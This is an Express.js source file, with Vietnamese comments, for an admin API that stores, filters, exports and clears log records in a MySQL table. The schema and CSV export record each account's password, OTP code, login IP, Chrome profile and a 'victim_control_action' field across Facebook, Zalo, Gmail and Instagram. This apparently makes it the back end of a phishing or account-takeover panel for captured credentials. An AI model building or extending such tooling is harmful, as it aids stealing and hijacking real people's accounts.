/**
 * Admin History API Routes - PRODUCTION VERSION
 * REST API cho Admin truy vấn lịch sử với filtering & pagination
 * Sử dụng real database và production logging
 */

import express from "express";
import { query, validationResult } from "express-validator";
import db from "../database.js";

const router = express.Router();

// Production database operations
class ProductionHistoryManager {
  constructor() {
    this.tableName = 'admin_history_logs';
  }

  // Initialize database table for admin history
  async initializeTable() {
    try {
      const createTableQuery = `
        CREATE TABLE IF NOT EXISTS ${this.tableName} (
          id VARCHAR(255) PRIMARY KEY,
          timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          platform VARCHAR(50) NOT NULL,
          action VARCHAR(100) NOT NULL,
          status ENUM('success', 'failed', 'pending', 'warning') NOT NULL,
          link_name VARCHAR(255),
          account VARCHAR(255),
          password_status VARCHAR(50),
          otp_code VARCHAR(20),
          login_ip VARCHAR(45),
          chrome_profile VARCHAR(100),
          notification TEXT,
          victim_control_action VARCHAR(50),
          user_identifier VARCHAR(255),
          message TEXT,
          metadata JSON,
          category VARCHAR(50),
          session_id VARCHAR(255),
          duration_ms INT DEFAULT 0,
          user_agent TEXT,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,

          INDEX idx_timestamp (timestamp),
          INDEX idx_platform (platform),
          INDEX idx_status (status),
          INDEX idx_account (account),
          INDEX idx_victim_action (victim_control_action),
          INDEX idx_user (user_identifier),
          INDEX idx_category (category),
          INDEX idx_session (session_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
      `;

      await db.query(createTableQuery);
      console.log("✅ Admin history table initialized");
      return true;
    } catch (error) {
      console.error("❌ Failed to initialize admin history table:", error);
      return false;
    }
  }

  // Add new log entry to database
  async addLog(logEntry) {
    try {
      const insertQuery = `
        INSERT INTO ${this.tableName} (
          id, timestamp, platform, action, status, link_name, account,
          password_status, otp_code, login_ip, chrome_profile, notification,
          victim_control_action, user_identifier, message, metadata, category,
          session_id, duration_ms, user_agent
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `;

      const values = [
        logEntry.id || `log_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        logEntry.timestamp || new Date(),
        logEntry.platform,
        logEntry.action,
        logEntry.status,
        logEntry.linkName,
        logEntry.account,
        logEntry.password,
        logEntry.otpCode,
        logEntry.loginIP,
        logEntry.chromeProfile,
        logEntry.notification,
        logEntry.victimControlAction,
        logEntry.user,
        logEntry.message,
        JSON.stringify(logEntry.metadata || {}),
        logEntry.category,
        logEntry.metadata?.sessionId,
        logEntry.metadata?.duration || 0,
        logEntry.metadata?.userAgent
      ];

      const result = await db.query(insertQuery, values);
      return result.insertId || values[0];
    } catch (error) {
      console.error("❌ Failed to add log entry:", error);
      throw error;
    }
  }

  // Query logs với filtering và pagination
  async queryLogs(filters = {}) {
    try {
      const {
        page = 1,
        limit = 50,
        platform,
        status,
        action,
        user,
        dateFrom,
        dateTo,
        category,
        search,
        sortBy = 'timestamp',
        sortOrder = 'desc'
      } = filters;

      // Build WHERE clause
      let whereConditions = [];
      let queryParams = [];

      if (platform && platform !== 'all') {
        whereConditions.push('platform = ?');
        queryParams.push(platform);
      }

      if (status && status !== 'all') {
        whereConditions.push('status = ?');
        queryParams.push(status);
      }

      if (action) {
        whereConditions.push('action LIKE ?');
        queryParams.push(`%${action}%`);
      }

      if (user) {
        whereConditions.push('(user_identifier LIKE ? OR account LIKE ?)');
        queryParams.push(`%${user}%`, `%${user}%`);
      }

      if (category && category !== 'all') {
        whereConditions.push('category = ?');
        queryParams.push(category);
      }

      if (dateFrom) {
        whereConditions.push('timestamp >= ?');
        queryParams.push(dateFrom);
      }

      if (dateTo) {
        whereConditions.push('timestamp <= ?');
        queryParams.push(dateTo);
      }

      if (search) {
        whereConditions.push('(message LIKE ? OR notification LIKE ? OR account LIKE ?)');
        queryParams.push(`%${search}%`, `%${search}%`, `%${search}%`);
      }

      const whereClause = whereConditions.length > 0 ?
        `WHERE ${whereConditions.join(' AND ')}` : '';

      // Count total records
      const countQuery = `SELECT COUNT(*) as total FROM ${this.tableName} ${whereClause}`;
      const countResult = await db.query(countQuery, queryParams);
      const totalItems = countResult[0]?.total || 0;

      // Calculate pagination
      const offset = (page - 1) * limit;
      const totalPages = Math.ceil(totalItems / limit);

      // Build ORDER BY clause
      const validSortColumns = ['timestamp', 'platform', 'status', 'user_identifier'];
      const safeSort = validSortColumns.includes(sortBy) ? sortBy : 'timestamp';
      const safeOrder = sortOrder === 'asc' ? 'ASC' : 'DESC';

      // Main query
      const mainQuery = `
        SELECT
          id, timestamp, platform, action, status, link_name as linkName,
          account, password_status as password, otp_code as otpCode,
          login_ip as loginIP, chrome_profile as chromeProfile,
          notification, victim_control_action as victimControlAction,
          user_identifier as user, message, metadata, category,
          session_id, duration_ms, user_agent
        FROM ${this.tableName}
        ${whereClause}
        ORDER BY ${safeSort} ${safeOrder}
        LIMIT ? OFFSET ?
      `;

      const finalParams = [...queryParams, parseInt(limit), offset];
      const logs = await db.query(mainQuery, finalParams);

      // Parse metadata JSON
      const parsedLogs = logs.map(log => ({
        ...log,
        metadata: typeof log.metadata === 'string' ? JSON.parse(log.metadata) : log.metadata
      }));

      // Generate statistics
      const stats = await this.generateStatistics(whereClause, queryParams);

      return {
        success: true,
        data: parsedLogs,
        pagination: {
          currentPage: parseInt(page),
          totalPages,
          totalItems,
          itemsPerPage: parseInt(limit),
          hasNext: page < totalPages,
          hasPrev: page > 1,
          nextPage: page < totalPages ? parseInt(page) + 1 : null,
          prevPage: page > 1 ? parseInt(page) - 1 : null,
        },
        filters,
        statistics: stats
      };

    } catch (error) {
      console.error("❌ Database query error:", error);
      throw error;
    }
  }

  // Generate real-time statistics from database
  async generateStatistics(whereClause = '', params = []) {
    try {
      const baseQuery = `SELECT * FROM ${this.tableName} ${whereClause}`;
      const allLogs = await db.query(baseQuery, params);

      const stats = {
        total: allLogs.length,
        success: allLogs.filter(log => log.status === 'success').length,
        failed: allLogs.filter(log => log.status === 'failed').length,
        pending: allLogs.filter(log => log.status === 'pending').length,
        warning: allLogs.filter(log => log.status === 'warning').length,
      };

      // Platform breakdown
      stats.byPlatform = allLogs.reduce((acc, log) => {
        acc[log.platform] = (acc[log.platform] || 0) + 1;
        return acc;
      }, {});

      // Time range
      if (allLogs.length > 0) {
        const timestamps = allLogs.map(log => new Date(log.timestamp)).sort((a, b) => a - b);
        stats.timeRange = {
          from: timestamps[0].toISOString(),
          to: timestamps[timestamps.length - 1].toISOString()
        };
      }

      return stats;
    } catch (error) {
      console.error("❌ Statistics generation error:", error);
      return {
        total: 0,
        success: 0,
        failed: 0,
        pending: 0,
        warning: 0,
        byPlatform: {},
        timeRange: { from: null, to: null }
      };
    }
  }

  // Clear old logs (production cleanup)
  async clearOldLogs(olderThanDate) {
    try {
      const deleteQuery = `DELETE FROM ${this.tableName} WHERE timestamp < ?`;
      const result = await db.query(deleteQuery, [olderThanDate]);
      return result.affectedRows || 0;
    } catch (error) {
      console.error("❌ Failed to clear old logs:", error);
      throw error;
    }
  }

  // Export logs for reporting
  async exportLogs(filters = {}) {
    try {
      const result = await this.queryLogs({ ...filters, limit: 10000 });
      return result.data;
    } catch (error) {
      console.error("❌ Export logs error:", error);
      throw error;
    }
  }
}

// Initialize production history manager
const historyManager = new ProductionHistoryManager();

// Initialize database table on module load
(async () => {
  try {
    await historyManager.initializeTable();
  } catch (error) {
    console.error("❌ Failed to initialize admin history system:", error);
  }
})();

/**
 * GET /api/admin/history
 * Truy vấn lịch sử với filtering và pagination
 */
router.get(
  "/history",
  [
    // Validation middleware
    query("page")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Page must be a positive integer"),
    query("limit")
      .optional()
      .isInt({ min: 1, max: 100 })
      .withMessage("Limit must be between 1-100"),
    query("platform")
      .optional()
      .isIn(["facebook", "zalo", "gmail", "instagram", "all"]),
    query("status")
      .optional()
      .isIn(["success", "failed", "pending", "warning", "all"]),
    query("action").optional().isString(),
    query("user").optional().isString(),
    query("dateFrom").optional().isISO8601(),
    query("dateTo").optional().isISO8601(),
    query("category").optional().isIn(["automation", "manual", "all"]),
    query("search").optional().isString(),
  ],
  async (req, res) => {
    try {
      // Check validation errors
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          errors: errors.array(),
          message: "Invalid query parameters",
        });
      }

      // Extract query parameters with defaults
      const {
        page = 1,
        limit = 50,
        platform = "all",
        status = "all",
        action,
        user,
        dateFrom,
        dateTo,
        category = "all",
        search,
        sortBy = "timestamp",
        sortOrder = "desc",
      } = req.query;

       // Use production database query
       const result = await historyManager.queryLogs({
         page,
         limit,
         platform,
         status,
         action,
         user,
         dateFrom,
         dateTo,
         category,
         search,
         sortBy,
         sortOrder,
       });

       // Add metadata
       result.meta = {
         requestTime: new Date().toISOString(),
         processingTime: Date.now() - (req.startTime || Date.now()),
         apiVersion: "1.0.0",
         dataSource: "production_database",
       };

       res.json(result);
    } catch (error) {
      console.error("Admin history API error:", error);
      res.status(500).json({
        success: false,
        error: "Failed to retrieve history",
        message: error.message,
        timestamp: new Date().toISOString(),
      });
    }
  }
);

/**
 * GET /api/admin/history/stats
 * Lấy thống kê tổng quan lịch sử
 */
router.get("/history/stats", async (req, res) => {
  try {
    const { timeRange = "24h" } = req.query;

    // Calculate time range
    let fromDate;
    switch (timeRange) {
      case "1h":
        fromDate = new Date(Date.now() - 60 * 60 * 1000);
        break;
      case "24h":
        fromDate = new Date(Date.now() - 24 * 60 * 60 * 1000);
        break;
      case "7d":
        fromDate = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
        break;
      case "30d":
        fromDate = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
        break;
      default:
        fromDate = new Date(Date.now() - 24 * 60 * 60 * 1000);
    }

    // Query recent logs from database
    const recentLogsResult = await historyManager.queryLogs({
      dateFrom: fromDate.toISOString(),
      limit: 10000 // Get all recent logs for statistics
    });

    const recentLogs = recentLogsResult.data;

    const stats = {
      timeRange,
      totalOperations: recentLogs.length,
      successRate:
        recentLogs.length > 0
          ? (
              (recentLogs.filter((log) => log.status === "success").length /
                recentLogs.length) *
              100
            ).toFixed(2)
          : 0,

      byStatus: {
        success: recentLogs.filter((log) => log.status === "success").length,
        failed: recentLogs.filter((log) => log.status === "failed").length,
        pending: recentLogs.filter((log) => log.status === "pending").length,
        warning: recentLogs.filter((log) => log.status === "warning").length,
      },

      byPlatform: {
        facebook: recentLogs.filter((log) => log.platform === "facebook")
          .length,
        zalo: recentLogs.filter((log) => log.platform === "zalo").length,
        gmail: recentLogs.filter((log) => log.platform === "gmail").length,
        instagram: recentLogs.filter((log) => log.platform === "instagram")
          .length,
      },

      byAction: recentLogs.reduce((acc, log) => {
        acc[log.action] = (acc[log.action] || 0) + 1;
        return acc;
      }, {}),

      averageResponseTime:
        recentLogs.length > 0
          ? (
              recentLogs.reduce(
                (sum, log) => sum + (log.metadata?.duration || 0),
                0
              ) / recentLogs.length
            ).toFixed(0)
          : 0,

      topUsers: Object.entries(
        recentLogs.reduce((acc, log) => {
          acc[log.user] = (acc[log.user] || 0) + 1;
          return acc;
        }, {})
      )
        .sort(([, a], [, b]) => b - a)
        .slice(0, 10)
        .map(([user, count]) => ({ user, operations: count })),

      timeline: generateTimeline(recentLogs, timeRange),

      lastUpdated: new Date().toISOString(),
    };

    res.json({
      success: true,
      data: stats,
      meta: {
        requestTime: new Date().toISOString(),
        timeRange,
        recordsAnalyzed: recentLogs.length,
      },
    });
  } catch (error) {
    console.error("Admin history stats error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to generate statistics",
      message: error.message,
    });
  }
});

/**
 * GET /api/admin/history/export
 * Export lịch sử dưới dạng CSV hoặc JSON
 */
router.get(
  "/history/export",
  [
    query("format").optional().isIn(["csv", "json"]),
    query("dateFrom").optional().isISO8601(),
    query("dateTo").optional().isISO8601(),
  ],
  async (req, res) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          errors: errors.array(),
        });
      }

      const { format = "json", dateFrom, dateTo } = req.query;

       // Use production database export
       const exportResult = await historyManager.exportLogs({
         dateFrom,
         dateTo,
         sortBy: 'timestamp',
         sortOrder: 'desc'
       });

       const exportLogs = exportResult;

      if (format === "csv") {
        // Generate CSV with all detailed fields
        const csvHeaders =
          "ID,Timestamp,Platform,Action,Status,LinkName,Account,Password,OTPCode,LoginIP,ChromeProfile,Notification,VictimControlAction,Duration,SessionID,UserAgent\n";
        const csvRows = exportLogs
          .map((log) =>
            [
              log.id,
              log.timestamp,
              log.platform,
              log.action,
              log.status,
              `"${(log.linkName || "").replace(/"/g, '""')}"`,
              log.account || log.user,
              log.password || "N/A",
              log.otpCode || "N/A",
              log.loginIP || log.metadata?.ip || "unknown",
              log.chromeProfile || "Default",
              `"${(log.notification || log.message || "").replace(/"/g, '""')}"`,
              log.victimControlAction || "none",
              log.metadata?.duration || 0,
              log.metadata?.sessionId || "N/A",
              `"${(log.metadata?.userAgent || "unknown").replace(/"/g, '""')}"`,
            ].join(",")
          )
          .join("\n");

        const csvContent = csvHeaders + csvRows;

        res.setHeader("Content-Type", "text/csv");
        res.setHeader(
          "Content-Disposition",
          `attachment; filename="history-export-${new Date().toISOString().split("T")[0]}.csv"`
        );
        res.send(csvContent);
      } else {
        // JSON format
        res.setHeader("Content-Type", "application/json");
        res.setHeader(
          "Content-Disposition",
          `attachment; filename="history-export-${new Date().toISOString().split("T")[0]}.json"`
        );

        res.json({
          exportInfo: {
            generatedAt: new Date().toISOString(),
            totalRecords: exportLogs.length,
            dateRange: {
              from:
                dateFrom ||
                (exportLogs.length > 0
                  ? exportLogs[exportLogs.length - 1].timestamp
                  : null),
              to:
                dateTo ||
                (exportLogs.length > 0 ? exportLogs[0].timestamp : null),
            },
            format: "json",
          },
          data: exportLogs,
        });
      }
    } catch (error) {
      console.error("History export error:", error);
      res.status(500).json({
        success: false,
        error: "Export failed",
        message: error.message,
      });
    }
  }
);

/**
 * DELETE /api/admin/history/clear
 * Xóa lịch sử (với bảo vệ)
 */
router.delete(
  "/history/clear",
  [
    query("confirm").equals("true").withMessage("Confirmation required"),
    query("olderThan").optional().isISO8601(),
  ],
  async (req, res) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          errors: errors.array(),
          message: "Confirmation required to clear history",
        });
      }

       const { olderThan } = req.query;

       // Get count before deletion
       const beforeResult = await historyManager.queryLogs({ limit: 1 });
       const beforeCount = beforeResult.pagination.totalItems;

       let deletedCount = 0;

       if (olderThan) {
         // Only delete logs older than specified date
         deletedCount = await historyManager.clearOldLogs(new Date(olderThan));
       } else {
         // Clear all history (with confirmation)
         deletedCount = await historyManager.clearOldLogs(new Date());
       }

       const afterResult = await historyManager.queryLogs({ limit: 1 });
       const remainingCount = afterResult.pagination.totalItems;

       // Emit real-time update via Socket.IO
       const io = req.app.get("io");
       if (io) {
         io.emit("admin:history:cleared", {
           deletedCount,
           remainingCount,
           timestamp: new Date().toISOString(),
         });
       }

       res.json({
         success: true,
         message: "History cleared successfully",
         data: {
           deletedRecords: deletedCount,
           remainingRecords: remainingCount,
           clearedAt: new Date().toISOString(),
         },
       });
    } catch (error) {
      console.error("History clear error:", error);
      res.status(500).json({
        success: false,
        error: "Failed to clear history",
        message: error.message,
      });
    }
  }
);

// Production function to add new log entry
export async function addHistoryLog(logEntry) {
  try {
    const logId = await historyManager.addLog(logEntry);

    // Also broadcast via Socket.IO if available
    const io = global.socketIO || null;
    if (io) {
      io.emit('admin:logs:new', {
        log: { id: logId, ...logEntry },
        timestamp: new Date().toISOString()
      });
    }

    return { id: logId, ...logEntry };
  } catch (error) {
    console.error("❌ Failed to add history log:", error);
    return null;
  }
}

// Production function to get current logs count
export async function getHistoryLogsCount() {
  try {
    const result = await historyManager.queryLogs({ limit: 1 });
    return result.pagination.totalItems;
  } catch (error) {
    console.error("❌ Failed to get logs count:", error);
    return 0;
  }
}

// Export history manager for use in other modules
export { historyManager };

export default router;
